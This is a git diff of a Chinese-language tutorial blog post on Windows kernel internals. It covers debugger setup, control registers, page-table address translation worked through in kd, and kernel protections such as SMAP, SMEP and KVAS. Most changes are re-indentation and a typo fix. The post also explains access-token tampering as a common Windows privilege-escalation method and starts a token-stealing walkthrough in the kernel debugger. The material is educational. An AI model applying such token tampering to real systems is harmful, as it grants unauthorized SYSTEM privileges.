@@ -60,7 +60,7 @@
     
     ```KEY```  要設甚麼都可以，開心就好。
 
-    完成後用 ```bcdedit /dbgsettings``` 查看設定好的配置，會長的像下面這樣(IP, POST, KEY 會因設定而異)
+    完成後用 ```bcdedit /dbgsettings``` 查看設定好的配置，會長的像下面這樣(IP, PORT, KEY 會因設定而異)
     
     ![ref9](https://lompandi.github.io/posts/post3/imgs/checksettings.png)
 </details>
@@ -91,7 +91,7 @@
     在以管理員身分執行的 CMD輸入 ```bcdedit /dbgsettings NET HOSTIP:<電腦的本地IP(LAN)>  PORT:<連線的通訊埠號> KEY:p.a.s.s```
     ```KEY``` 要設甚麼都可以，開心就好。
 
-    完成後用 ```bcdedit /dbgsettings``` 查看設定好的配置，會長的像下面這樣(IP, POST, KEY 會因設定而異)
+    完成後用 ```bcdedit /dbgsettings``` 查看設定好的配置，會長的像下面這樣(IP, PORT, KEY 會因設定而異)
     
     ![ref9](https://lompandi.github.io/posts/post3/imgs/checksettings.png)
     
@@ -137,32 +137,33 @@
 ![ref1](https://lompandi.github.io/posts/post3/imgs/062111_1434_x86x8664CPU1.png)
 
 其中灰色區域為保留欄位。
+    
+* ### 重要欄位說明:
 
-### 重要欄位說明:
-### Cr0: 
-
-|位元|欄位名稱|意義|
-|----|-|----|
-|31  | PG |控制分頁機制 (Paging) 是否生效，若為 1，分頁機制生效，把線性位址轉換為物理位址；若為 0， 分頁機制無效，線性位址直接作為物理位址|
-|0   | PE| 若為 0，則CPU處於真實模式 (Real Mode)，此時 使用分段機制，此時若將PG設置為 1 將引起一般保護錯誤 (GPF)|
-
-### Cr2:
-|位元|欄位名稱|意義|
-|----|--------|----|
-|63~0| -      |  存放[分頁錯誤](https://zh.wikipedia.org/zh-tw/%E9%A1%B5%E7%BC%BA%E5%A4%B1)的虛擬位址|
-
-### Cr3 (PDBR):
-|位元|欄位名稱|意義|
-|----|--------|----|
-|51 ~ 12|-    | 指定**4級分頁表**的**基底位址**|
-
-### Cr4:
-![cr4](https://lompandi.github.io/posts/post3/imgs/CR4.jpg)
-|位元|欄位名稱|意義|
-|----|--------|----|
-|21  | SMAP   | 指定SMAP是否生效|
-|20  | SMEP   | 指定SMEP是否生效|
-|5   | PAE    | 指定[實體位址擴充](https://zh.wikipedia.org/zh-tw/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E6%89%A9%E5%B1%95)是否生效|
+    * ### Cr0: 
+    
+    |位元|欄位名稱|意義|
+    |----|-|----|
+    |31  | PG |控制分頁機制 (Paging) 是否生效，若為 1，分頁機制生效，把線性位址轉換為物理位址；若為 0， 分頁機制無效，線性位址直接作為物理位址|
+    |0   | PE| 若為 0，則CPU處於真實模式 (Real Mode)，此時 使用分段機制，此時若將PG設置為 1 將引起一般保護錯誤 (GPF)|
+    
+    * ### Cr2:
+    |位元|欄位名稱|意義|
+    |----|--------|----|
+    |63~0| -      |  存放[分頁錯誤](https://zh.wikipedia.org/zh-tw/%E9%A1%B5%E7%BC%BA%E5%A4%B1)的虛擬位址|
+    
+    * ### Cr3 (PDBR):
+    |位元|欄位名稱|意義|
+    |----|--------|----|
+    |51 ~ 12|-    | 指定**4級分頁表**的**基底位址**|
+    
+    * ### Cr4:
+    ![cr4](https://lompandi.github.io/posts/post3/imgs/CR4.jpg)
+    |位元|欄位名稱|意義|
+    |----|--------|----|
+    |21  | SMAP   | 指定SMAP是否生效|
+    |20  | SMEP   | 指定SMEP是否生效|
+    |5   | PAE    | 指定[實體位址擴充](https://zh.wikipedia.org/zh-tw/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E6%89%A9%E5%B1%95)是否生效|
 
 ## II.2 記憶體布局和虛擬位址
 在 Windows 系統中，核心模式和使用者模式的記憶體分區大致上如下:
@@ -176,107 +177,107 @@
 
 (表中 64 位元 Windows 記憶體分區以 Windows 10 為例)
 
-1. #### 空指標指定值分區: 
+* ### 1. 空指標指定值分區: 
 
-空 (NULL) 指標指定值分區是處理虛擬位址空間中 0x0000000 ~ 0x0000FFFF
-   
-的閉區間，如果處理程序試圖讀去或寫入位於這一分區的記憶體位址，就會引發**存取違規** (Access Violation)。
+    空 (NULL) 指標指定值分區是處理虛擬位址空間中 0x0000000 ~ 0x0000FFFF
+       
+    的閉區間，如果處理程序試圖讀去或寫入位於這一分區的記憶體位址，就會引發**存取違規** (Access Violation)。
 
-2. #### 使用者模式 (User Mode) 分區
+* ### 2. 使用者模式 (User Mode) 分區
 
-使用者模式分區是每個處理程序可以使用的虛擬位址空間。程式中用到的動態連結程式庫 (dll)
+    使用者模式分區是每個處理程序可以使用的虛擬位址空間。程式中用到的動態連結程式庫 (dll)
+    
+    也會載入這一分區，但是**程式執行時還要透過記憶體管理單元 (MMU) 將虛擬位址映射為實體記憶體位址 (Physical Address)**，
+    
+    處理程序可用的虛擬位址空間總量受物理儲存空間 (即實體記憶體) 含虛擬記憶體大小之和的限制。
+    
+    雖然 64 位元程式理論上可以使用 128TB 的虛擬空間，但實際上作業系統目前並不支援這麼大的虛擬位址空間，一方面不需要，
+    
+    另一方面管理和維護這麼大的位址空間需要較大的消耗。
 
-也會載入這一分區，但是**程式執行時還要透過記憶體管理單元 (MMU) 將虛擬位址映射為實體記憶體位址 (Physical Address)**，
+* ### 3. 禁入分區
 
-處理程序可用的虛擬位址空間總量受物理儲存空間 (即實體記憶體) 含虛擬記憶體大小之和的限制。
+    由 Windows 保留的一快虛擬記憶體位址區域。
 
-雖然 64 位元程式理論上可以使用 128TB 的虛擬空間，但實際上作業系統目前並不支援這麼大的虛擬位址空間，一方面不需要，
+* ### 4. 核心模式 (Kernel Mode) 分區
 
-另一方面管理和維護這麼大的位址空間需要較大的消耗。
-
-3. #### 禁入分區
-
-由 Windows 保留的一快虛擬記憶體位址區域。
-
-4. #### 核心模式 (Kernel Mode) 分區
-
-核心模式分區式作業系統程式的駐地，與執行緒排序、記憶體管理、檔案系統、網路支援以及**驅動裝置程式**相關的程式都
-
-載入該分區。該分區中的所有程式和資料都被保護起來，如果一個應用程式 (位於使用者模式分區)
-
-試圖讀去或寫入位於這一分區的記憶體位址，就會引發**存取違規**，導致系統強制結束該程式。
+    核心模式分區式作業系統程式的駐地，與執行緒排序、記憶體管理、檔案系統、網路支援以及**驅動裝置程式**相關的程式都
+    
+    載入該分區。該分區中的所有程式和資料都被保護起來，如果一個應用程式 (位於使用者模式分區)
+    
+    試圖讀去或寫入位於這一分區的記憶體位址，就會引發**存取違規**，導致系統強制結束該程式。
 
 * ## 虛擬位址(線性位址)
 
-### 歷史
-在**保護模式**引入之前（即 80286 處理器之前），**真實模式（Real Mode）** 是 x86 架構的唯一工作模式，而 真實模式並沒有虛擬位址和特權等級的概念，程式可以任意修改實體記憶體位址處的內容，包括系統程式。這帶給作業系統極大的安全問題。
+* ### 歷史
+    在**保護模式**引入之前（即 80286 處理器之前），**真實模式（Real Mode）** 是 x86 架構的唯一工作模式，而 真實模式並沒有虛擬位址和特權等級的概念，程式可以任意修改實體記憶體位址處的內容，包括系統程式。這帶給作業系統極大的安全問題。
 
-Intel 在 1982 年推出的 80286 處理器中引入**保護模式（Protected Mode）**，首次引入是虛擬位址，並在後續的 80386 處理器中進一步完善。
+    Intel 在 1982 年推出的 80286 處理器中引入**保護模式（Protected Mode）**，首次引入是虛擬位址，並在後續的 80386 處理器中進一步完善。
 
-### 原理
-虛擬位址是通過硬體和作業系統將實體位址轉換而成的連續位址空間。在現代作業系統中，虛擬位址讓**每個程式都能擁有獨立的記憶體空間**，從而避免不同程式之間的記憶體衝突。這些虛擬位址最終會被轉換為實體位址。
+* ### 原理
+    虛擬位址是通過硬體和作業系統將實體位址轉換而成的連續位址空間。在現代作業系統中，虛擬位址讓**每個程式都能擁有獨立的記憶體空間**，從而避免不同程式之間的記憶體衝突。這些虛擬位址最終會被轉換為實體位址。
 
-使用四級分頁表的虛擬記憶體的組成如下:
+    使用四級分頁表的虛擬記憶體的組成如下:
 
 ![ref3](https://lompandi.github.io/posts/post3/imgs/Addressing.png)
 
-```c++
-union VIRTUAL_ADDRESS {
-    struct {
-        uint64_t Offset : 12;
-        uint64_t PtIndex : 9;
-        uint64_t PdIndex : 9;
-        uint64_t PdPtIndex : 9;
-        uint64_t Pml4Index : 9;
-        uint64_t Reserved : 16;
-    } u;
-};
-```
+    ```c++
+    union VIRTUAL_ADDRESS {
+        struct {
+            uint64_t Offset : 12;
+            uint64_t PtIndex : 9;
+            uint64_t PdIndex : 9;
+            uint64_t PdPtIndex : 9;
+            uint64_t Pml4Index : 9;
+            uint64_t Reserved : 16;
+        } u;
+    };
+    ```
 
-其中除保留欄位外，剩下的欄位都是用來轉換其到實體位址的，下面慢慢說。
+    其中除保留欄位外，剩下的欄位都是用來轉換其到實體位址的，下面慢慢說。
 
 * ## 分頁表:
 
-### 說明:
+* ### 說明:
 
-|名詞 |意思|
-|-----|----|
-|PML4 |**P**age **M**ap **L**evel **4**，四級分頁映射表|
-|PDPT| **P**age **D**irectory **P**ointer **T**able，分頁目錄指標表|
-|PD  | **P**age **D**irectory，分頁目錄表|
-|PT  | **P**age **T**able，分頁表|
+    |名詞 |意思|
+    |-----|----|
+    |PML4 |**P**age **M**ap **L**evel **4**，四級分頁映射表|
+    |PDPT| **P**age **D**irectory **P**ointer **T**able，分頁目錄指標表|
+    |PD  | **P**age **D**irectory，分頁目錄表|
+    |PT  | **P**age **T**able，分頁表|
 
-### 分頁表入口 (Page Table Entry, PTE)
-尾端的 "E"(如PML4**E**、PT**E**) 代表 "Entry"，即分頁表的入口，每個入口大小為8個位元。
-
- PML4 表包含了 512 個 PML4E，所以這代表4級分頁表可以容納 512GB 的實體位址。
-
-Windows 在 ```MMPTE_HARDWARE```  中定義了分頁表入口的結構:
-```c++
-union MMPTE_HARDWARE {
-    struct {
-        uint64_t Present : 1;               //P
-        uint64_t Write : 1;                 //R/W
-        uint64_t UserAccessible : 1;        //U/S
-        uint64_t WriteThrough : 1;          //PWT
-        uint64_t CacheDisable : 1;          //PCD
-        uint64_t Accessed : 1;              //A
-        uint64_t Dirty : 1;                 //D
-        uint64_t LargePage : 1;             //PS
-        uint64_t Available : 4;             //G
-        uint64_t PageFrameNumber : 36;
-        uint64_t ReservedForHardware : 4;   
-        uint64_t ReservedForSoftware : 11;
-        uint64_t NoExecute : 1;             //XD
-    } u;
-};
-```
-
-(P.S. **其實PML4、PDPT、PD、PT的入口都是這種結構**，只是名稱容易混淆)
-
-分頁表入口結構包含硬體控制位元，可以控制分頁的屬性。
-
-一些常用的硬體控制位元如下:
+* ### 分頁表入口 (Page Table Entry, PTE)
+    尾端的 "E"(如PML4**E**、PT**E**) 代表 "Entry"，即分頁表的入口，每個入口大小為8個位元。
+    
+     PML4 表包含了 512 個 PML4E，所以這代表4級分頁表可以容納 512GB 的實體位址。
+    
+    Windows 在 ```MMPTE_HARDWARE```  中定義了分頁表入口的結構:
+    ```c++
+    union MMPTE_HARDWARE {
+        struct {
+            uint64_t Present : 1;               //P
+            uint64_t Write : 1;                 //R/W
+            uint64_t UserAccessible : 1;        //U/S
+            uint64_t WriteThrough : 1;          //PWT
+            uint64_t CacheDisable : 1;          //PCD
+            uint64_t Accessed : 1;              //A
+            uint64_t Dirty : 1;                 //D
+            uint64_t LargePage : 1;             //PS
+            uint64_t Available : 4;             //G
+            uint64_t PageFrameNumber : 36;
+            uint64_t ReservedForHardware : 4;   
+            uint64_t ReservedForSoftware : 11;
+            uint64_t NoExecute : 1;             //XD
+        } u;
+    };
+    ```
+    
+    (P.S. **其實PML4、PDPT、PD、PT的入口都是這種結構**，只是名稱容易混淆)
+    
+    分頁表入口結構包含硬體控制位元，可以控制分頁的屬性。
+    
+    一些常用的硬體控制位元如下:
 #### 1. 存在（P）:
 
 決定線性位址在實體記憶體中的位置。如果沒有實體位址，則會發生分頁錯誤，且 MMU 將嘗試將位址映射到 RAM 中。
@@ -317,148 +318,148 @@ union MMPTE_HARDWARE {
 控制暫存器 CR3 負責指定4級分頁表(PLM4)。
 
 * ### 步驟一
-將 CR3 轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber```  乘以**4096**，得到**PML4 的基底實體位址**。
-
-再將要轉換的虛擬位址中的 PML4 Index 乘以 8，加上 PML4 的基底實體位址，得到 **PML4E 的實體位址**。
+    將 CR3 轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber```  乘以**4096**，得到**PML4 的基底實體位址**。
+    
+    再將要轉換的虛擬位址中的 PML4 Index 乘以 8，加上 PML4 的基底實體位址，得到 **PML4E 的實體位址**。
 
 * ### 步驟二
-從 PLM4E 的實體位址讀入 8 個位元組並轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber``` 乘以 4096，得到 **PDPT 的基底實體位址**。
+    從 PLM4E 的實體位址讀入 8 個位元組並轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber``` 乘以 4096，得到 **PDPT 的基底實體位址**。
 
-將要轉換的虛擬位址中的 PDPT Index 乘以 8，加上 PDPT 的基底實體位址，得到 **PDPTE 的實體位址**。
+    將要轉換的虛擬位址中的 PDPT Index 乘以 8，加上 PDPT 的基底實體位址，得到 **PDPTE 的實體位址**。
 
 * ### 步驟三
-從 PDPTE 的實體位址讀入 8 個位元組並轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber``` 乘以 4096，得到 **PD 的基底實體位址**。
+    從 PDPTE 的實體位址讀入 8 個位元組並轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber``` 乘以 4096，得到 **PD 的基底實體位址**。
 
 * ### 步驟四(1) (PDPTE 的 PS 旗標為 1)，完成計算
-這時如果 PDPTE 的 PS 旗標（位元 7）為 1，無須分頁表。直接將 PD 的基底實體位址與虛擬位址中前 30 個 位元相加，**即可直接對應所求的實體記憶體位址**。
+    這時如果 PDPTE 的 PS 旗標（位元 7）為 1，無須分頁表。直接將 PD 的基底實體位址與虛擬位址中前 30 個 位元相加，**即可直接對應所求的實體記憶體位址**。
 
 * ### 步驟四(2) (PDPTE 的 PS 旗標為 0)
-如果 PDPTE 的 PS 旗標為 0 ，那麼就像前兩次所做的那樣，將虛擬位址中的 PD Index 乘以 8 個然後加上 **PD 基底實體位址**，得到 **PDE 的實體位址**。
+    如果 PDPTE 的 PS 旗標為 0 ，那麼就像前兩次所做的那樣，將虛擬位址中的 PD Index 乘以 8 個然後加上 **PD 基底實體位址**，得到 **PDE 的實體位址**。
 
 * ### 步驟五
-從 PDE 的實體位址讀入 8 個位元組並轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber``` 乘以 4096 得到**PT 的基底實體位址**。
+    從 PDE 的實體位址讀入 8 個位元組並轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber``` 乘以 4096 得到**PT 的基底實體位址**。
 
 * ### 步驟六(1) (PDE 的 PS 旗標為 1)，完成計算
-如果 PDE 的 PS 旗標為 1，直接將虛擬位址中前 28 個位元和 **PT 基底實體位址** 相加，**即可直接對應所求的實體記憶體位址**。
+    如果 PDE 的 PS 旗標為 1，直接將虛擬位址中前 28 個位元和 **PT 基底實體位址** 相加，**即可直接對應所求的實體記憶體位址**。
 
 * ### 步驟六(2) (PDE 的 PS 旗標為 0)
-反之，如果 PDE 的 PS 旗標為 0，則將虛擬位址中的 PT Index 乘以 8 個然後加上 **PT 基底實體位址**，得到  **PTE 的實體位址**。之後，
+    反之，如果 PDE 的 PS 旗標為 0，則將虛擬位址中的 PT Index 乘以 8 個然後加上 **PT 基底實體位址**，得到  **PTE 的實體位址**。
 
 * ### 步驟七，完成計算
-從 PTE 的實體位址讀入 8 個位元組並轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber``` 乘以 4096 加上虛擬位址的 Offset，**即可得到所求的實體記憶體位址**。
+    從 PTE 的實體位址讀入 8 個位元組並轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber``` 乘以 4096 加上虛擬位址的 Offset，**即可得到所求的實體記憶體位址**。
 
-有分支計算的部份可能有些眼花撩亂，幫大家整理一下:
+    有分支計算的部份可能有些眼花撩亂，幫大家整理一下:
 
-#### 1. *if* PDPTE.PS is *1* -> *Physical Address* = *PD Base* + *Virtual Address*[0:29]
-#### 2. *if* PDE.PS is *1* ->   *Physical Address* = *PT Vase* + *Virtual Address*[0:27]
+    #### 1. *if* PDPTE.PS is *1* -> *Physical Address* = *PD Base* + *Virtual Address*[0:29]
+    #### 2. *if* PDE.PS is *1* ->   *Physical Address* = *PT Vase* + *Virtual Address*[0:27]
 
-幸運的是，我們不必手動計算每個分頁結構表，因為 kd 中的!pte指令可以直接幫我們計算。
+    幸運的是，我們不必手動計算每個分頁結構表，因為 kd 中的!pte指令可以直接幫我們計算。
 
-```
-kd> !pte fffff802`7c000000
-                                           VA fffff8027c000000
-PXE at FFFFBE5F2F97CF80    PPE at FFFFBE5F2F9F0048    PDE at FFFFBE5F3E009F00    PTE at FFFFBE7C013E0000
-contains 0000000003F09063  contains 0000000003F0A063  contains 8A000000020001A1  contains 0000000000000000
-pfn 3f09      ---DA--KWEV  pfn 3f0a      ---DA--KWEV  pfn 2000      -GL-A--KR-V  LARGE PAGE pfn 2000
-```
+    ```
+    kd> !pte fffff802`7c000000
+                                               VA fffff8027c000000
+    PXE at FFFFBE5F2F97CF80    PPE at FFFFBE5F2F9F0048    PDE at FFFFBE5F3E009F00    PTE at FFFFBE7C013E0000
+    contains 0000000003F09063  contains 0000000003F0A063  contains 8A000000020001A1  contains 0000000000000000
+    pfn 3f09      ---DA--KWEV  pfn 3f0a      ---DA--KWEV  pfn 2000      -GL-A--KR-V  LARGE PAGE pfn 2000
+    ```
+    
+    其中每條虛線對應一個特定的控制位元。PXE 部分實際上是指該線性位址的 PML4 表，而 PPE 則表示分頁 PDP 表。(為甚麼要亂給人家改名字??😭)
+    
+    那接下來我們就使用上述方式來手算 ```fffff802`7c000000``` 的 Physical Address。
 
-其中每條虛線對應一個特定的控制位元。PXE 部分實際上是指該線性位址的 PML4 表，而 PPE 則表示分頁 PDP 表。(為甚麼要亂給人家改名字??😭)
-
-那接下來我們就使用上述方式來手算 ```fffff802`7c000000``` 的 Physical Address。
-
-手先，輸入 ```r cr3``` 取得cr3的值:
-```
-kd> r cr3
-cr3=00000000001ad000
-```
-先將 Virtual Address 轉換，得到分頁表的索引值和偏移值:
-```
-Offset: 0
-PtIndex: 0
-PdIndex: 1e0
-PdPtIndex: 9
-Pml4Index: 1f0
-```
-
-取其 12~48 個位元，即 ```0x0000001ad```，乘以 4096，得到 ```0x00000000001ad000```。加上 ```Pml4Index x 8```，即 ```0x1F0 x 8 = 0xF80```，得 PML4E 的位址在 ```0x00000000`001adf80```。
-
-接下來，使用```!dq 0x00000000`001adf80 L1``` 來取得實體位址 ```0x00000000`001adf80``` 的指標。(q 代表 quadword，在 64 位元架構上是 8 個 byte)
-
-```
-kd> !dq 0x00000000`001adf80 L1
-#  1adf80 00000000`03f09063
-```
-得到 PML4E ```0x00000000`03f09063```。 和 !pte 的 PXE 對應一下，發現我們計算正確。
-
-接下來，取```0x00000000`03f09063```的 12~48 個位元，乘以 4096，得 ```0x00000000`03f09000```。加上 0x48 (即 PdPtIndex x 8)，得到 PDPTE 的位址在 ```0x00000000`03f09048```:
-```
-kd> !dq 0x00000000`03f09048 L1
-# 3f09048 00000000`03f0a063
-```
-得到 PDPTE ```00000000`03f0a063```。 和 !pte 的 PPE 對應一下，發現我們計算正確。
-
-接下來，先將 PDPTE 轉換成```MMPTE_HARDWARE```:
-```
-Present: 1
-Write: 1
-UserAccessible: 0
-WriteThrough: 0
-CacheDisable: 0
-Accessed: 1
-Dirty: 1
-LargePage: 0
-Available: 0
-PageFrameNumber: 3f0a
-NoExecute: 0
-```
-發現其 LargePage 設為 0，故繼續計算，
-取```00000000`03f0a063```的 12~48 個位元，乘以 4096，得 ```0x00000000`03f0a000```。加上 0xF00 (即 PdIndex x 8)，得到 PDE 的位址在 ```0x00000000`03f0af00```:
-
-```
-kd> !dq 0x00000000`03f0af00 L1
-# 3f0af00 8a000000`020001a1
-```
-得到 PDE ```8a000000`020001a1```，將其轉換成```MMPTE_HARDWARE```:
-```
-Present: 1
-Write: 0
-UserAccessible: 0
-WriteThrough: 0
-CacheDisable: 0
-Accessed: 1
-Dirty: 0
-LargePage: 1
-Available: 1
-PageFrameNumber: 2000
-NoExecute: 1
-```
-發現其 LargePage 設為 1，故取```0x8a000000`020001a1```的 12~48 個位元，乘以 4096，得 ```0x02000000```。
-
-並將其加上 Virtual Address 的 1 ~ 28 位元，得轉換後的實體位址 = 0x02000000 + 0 = **0x02000000**。
-
-接著使用```dq```和```!dq```來比較 Virtual Address 和 Physical Address 的資訊，並檢查計算結果:
-```
-kd> dq fffff802`7c000000
-fffff802`7c000000  00000003`00905a4d 0000ffff`00000004
-fffff802`7c000010  00000000`000000b8 00000000`00000040
-fffff802`7c000020  00000000`00000000 00000000`00000000
-fffff802`7c000030  00000000`00000000 00000118`00000000
-fffff802`7c000040  cd09b400`0eba1f0e 685421cd`4c01b821
-fffff802`7c000050  72676f72`70207369 6f6e6e61`63206d61
-fffff802`7c000060  6e757220`65622074 20534f44`206e6920
-fffff802`7c000070  0a0d0d2e`65646f6d 00000000`00000024
-kd> !dq 0x02000000
-# 2000000 00000003`00905a4d 0000ffff`00000004
-# 2000010 00000000`000000b8 00000000`00000040
-# 2000020 00000000`00000000 00000000`00000000
-# 2000030 00000000`00000000 00000118`00000000
-# 2000040 cd09b400`0eba1f0e 685421cd`4c01b821
-# 2000050 72676f72`70207369 6f6e6e61`63206d61
-# 2000060 6e757220`65622074 20534f44`206e6920
-# 2000070 0a0d0d2e`65646f6d 00000000`00000024
-```
-
-可以發現，兩者包含的資訊相同，故我們的轉換計算正確 <span style="font-size: 24px;">😆</span> 。
+    手先，輸入 ```r cr3``` 取得cr3的值:
+    ```
+    kd> r cr3
+    cr3=00000000001ad000
+    ```
+    先將 Virtual Address 轉換，得到分頁表的索引值和偏移值:
+    ```
+    Offset: 0
+    PtIndex: 0
+    PdIndex: 1e0
+    PdPtIndex: 9
+    Pml4Index: 1f0
+    ```
+    
+    取其 12~48 個位元，即 ```0x0000001ad```，乘以 4096，得到 ```0x00000000001ad000```。加上 ```Pml4Index x 8```，即 ```0x1F0 x 8 = 0xF80```，得 PML4E 的位址在 ```0x00000000`001adf80```。
+    
+    接下來，使用```!dq 0x00000000`001adf80 L1``` 來取得實體位址 ```0x00000000`001adf80``` 的指標。(q 代表 quadword，在 64 位元架構上是 8 個 byte)
+    
+    ```
+    kd> !dq 0x00000000`001adf80 L1
+    #  1adf80 00000000`03f09063
+    ```
+    得到 PML4E ```0x00000000`03f09063```。 和 !pte 的 PXE 對應一下，發現我們計算正確。
+    
+    接下來，取```0x00000000`03f09063```的 12~48 個位元，乘以 4096，得 ```0x00000000`03f09000```。加上 0x48 (即 PdPtIndex x 8)，得到 PDPTE 的位址在 ```0x00000000`03f09048```:
+    ```
+    kd> !dq 0x00000000`03f09048 L1
+    # 3f09048 00000000`03f0a063
+    ```
+    得到 PDPTE ```00000000`03f0a063```。 和 !pte 的 PPE 對應一下，發現我們計算正確。
+    
+    接下來，先將 PDPTE 轉換成```MMPTE_HARDWARE```:
+    ```
+    Present: 1
+    Write: 1
+    UserAccessible: 0
+    WriteThrough: 0
+    CacheDisable: 0
+    Accessed: 1
+    Dirty: 1
+    LargePage: 0
+    Available: 0
+    PageFrameNumber: 3f0a
+    NoExecute: 0
+    ```
+    發現其 LargePage 設為 0，故繼續計算，
+    取```00000000`03f0a063```的 12~48 個位元，乘以 4096，得 ```0x00000000`03f0a000```。加上 0xF00 (即 PdIndex x 8)，得到 PDE 的位址在 ```0x00000000`03f0af00```:
+    
+    ```
+    kd> !dq 0x00000000`03f0af00 L1
+    # 3f0af00 8a000000`020001a1
+    ```
+    得到 PDE ```8a000000`020001a1```，將其轉換成```MMPTE_HARDWARE```:
+    ```
+    Present: 1
+    Write: 0
+    UserAccessible: 0
+    WriteThrough: 0
+    CacheDisable: 0
+    Accessed: 1
+    Dirty: 0
+    LargePage: 1
+    Available: 1
+    PageFrameNumber: 2000
+    NoExecute: 1
+    ```
+    發現其 LargePage 設為 1，故取```0x8a000000`020001a1```的 12~48 個位元，乘以 4096，得 ```0x02000000```。
+    
+    並將其加上 Virtual Address 的 1 ~ 28 位元，得轉換後的實體位址 = 0x02000000 + 0 = **0x02000000**。
+    
+    接著使用```dq```和```!dq```來比較 Virtual Address 和 Physical Address 的資訊，並檢查計算結果:
+    ```
+    kd> dq fffff802`7c000000
+    fffff802`7c000000  00000003`00905a4d 0000ffff`00000004
+    fffff802`7c000010  00000000`000000b8 00000000`00000040
+    fffff802`7c000020  00000000`00000000 00000000`00000000
+    fffff802`7c000030  00000000`00000000 00000118`00000000
+    fffff802`7c000040  cd09b400`0eba1f0e 685421cd`4c01b821
+    fffff802`7c000050  72676f72`70207369 6f6e6e61`63206d61
+    fffff802`7c000060  6e757220`65622074 20534f44`206e6920
+    fffff802`7c000070  0a0d0d2e`65646f6d 00000000`00000024
+    kd> !dq 0x02000000
+    # 2000000 00000003`00905a4d 0000ffff`00000004
+    # 2000010 00000000`000000b8 00000000`00000040
+    # 2000020 00000000`00000000 00000000`00000000
+    # 2000030 00000000`00000000 00000118`00000000
+    # 2000040 cd09b400`0eba1f0e 685421cd`4c01b821
+    # 2000050 72676f72`70207369 6f6e6e61`63206d61
+    # 2000060 6e757220`65622074 20534f44`206e6920
+    # 2000070 0a0d0d2e`65646f6d 00000000`00000024
+    ```
+    
+    可以發現，兩者包含的資訊相同，故我們的轉換計算正確 <span style="font-size: 24px;">😆</span> 。
 
 ## II.4 分級保護域
 ![ref15](https://lompandi.github.io/posts/post3/imgs/prings.png)
@@ -642,11 +643,11 @@ kd> !dq 0x02000000
 
 * ### Access Token
 
-存取權杖 (Access Token) 簡單來說就是一個用來描述程序或執行緒的資料，當使用者登入時，系統會產生存取權杖，
-
-並以此識別程序或執行緒的使用者**以及其權限**。如果要更詳細的資訊，可以參考由 Microsoft 提供的[參考文件](https://learn.microsoft.com/zh-tw/windows/win32/secauthz/access-tokens)。
-
-實際上，Access Token 是有可能被篡改的，這意味著你可以將一個具有更高權限(如，系統權限)的 Access Token 嵌入到你的程序中，從而使你的程式獲得與該高權限程序相同的權限。這就是 Windows 中**特權提升**(或提權)的常用做法。
+    存取權杖 (Access Token) 簡單來說就是一個用來描述程序或執行緒的資料，當使用者登入時，系統會產生存取權杖，
+    
+    並以此識別程序或執行緒的使用者**以及其權限**。如果要更詳細的資訊，可以參考由 Microsoft 提供的[參考文件](https://learn.microsoft.com/zh-tw/windows/win32/secauthz/access-tokens)。
+    
+    實際上，Access Token 是有可能被篡改的，這意味著你可以將一個具有更高權限(如，系統權限)的 Access Token 嵌入到你的程序中，從而使你的程式獲得與該高權限程序相同的權限。這就是 Windows 中**特權提升**(或提權)的常用做法。
 
 我們可以用 kd 來**模擬**提權的過程，首先，在虛擬機器中開啟一個 CMD，接下來在CMD中輸入 ```whoami```:
 ```
@@ -690,6 +691,7 @@ PROCESS ffffe60fc927b040
 ```
 這樣，擁有系統權限的 Token 就到手了!那麼，我們如何把 cmd.exe 的 Token 竄改成 system 的呢?
 
+* ### _EPROCESS
 我們之前輸入 ```!process <...>``` 時，會出現一個 ```PROCESS <...>```，它指向一個叫 EPROCESS 的結構。每個程序都有自己的 EPROCESS 結構，裡面儲存了 Access Token。
 
 可以在 kd 中輸入 ```dt nt!_EPROCESS``` 來查看 ```EPROCESS``` 的整體結構。
@@ -926,18 +928,18 @@ nt authority/system
 Kernel 做為一個系統中重要的物件，自然不會乖乖站在那邊給你打，Kernel Mode 有一套有別於 User Mode 的保護，最常見的有下列幾項:
 
 * ### SMAP (Supervisor Mode Access Prevention)
-由控制暫存 Cr4 中的第 21 個位元控制。若開啟，將**禁止核心模式的程序直接存取所有使用者模式分區的資料**。
+    由控制暫存 Cr4 中的第 21 個位元控制。若開啟，將**禁止核心模式的程序直接存取所有使用者模式分區的資料**。
 
 * ### SMEP (Supervisor Mode Execution Prevention)
-由控制暫存 Cr4 中的第 20 個位元控制。若開啟，將**禁止核心模式的程序執行位於使用者模式分區的代碼**。
+    由控制暫存 Cr4 中的第 20 個位元控制。若開啟，將**禁止核心模式的程序執行位於使用者模式分區的代碼**。
 
 * ### KVAS (Kernel Virtual Address Shadow)
-核心頁表隔離機制（KVAS）將程序的頁表根據使用者模式和核心模式分割成兩份(即 Shadowing 的概念)，從而有效防止使用者模式透過旁路攻擊竊取核心模式的敏感數據。這一機制在 Windows 10/11 上預設為開啟狀態。
+    核心頁表隔離機制（KVAS）將程序的頁表根據使用者模式和核心模式分割成兩份(即 Shadowing 的概念)，從而有效防止使用者模式透過旁路攻擊竊取核心模式的敏感數據。這一機制在 Windows 10/11 上預設為開啟狀態。
 
-如果開啟KVAS的話，應用程式會有兩個CR3，分別指向 ```PCB.DirectoryTableBase``` 和 ```PCB.UserDirectoryTableBase``` 兩個 PML4 表基底位址。其中 DirectoryTableBase 為核心 PML4 的基底。而使用者模式的Cr3（UserDirectoryTableBase）只映射了核心 KVASCODE 區段的物理頁（少數ring 3進入ring 0的入口），而沒有映射其他區段的，因此透過3環的Cr3來尋找核心 TEXT section 的分頁表，**最多只能找到 PPE，從 PDE 開始就沒有被映射了**。
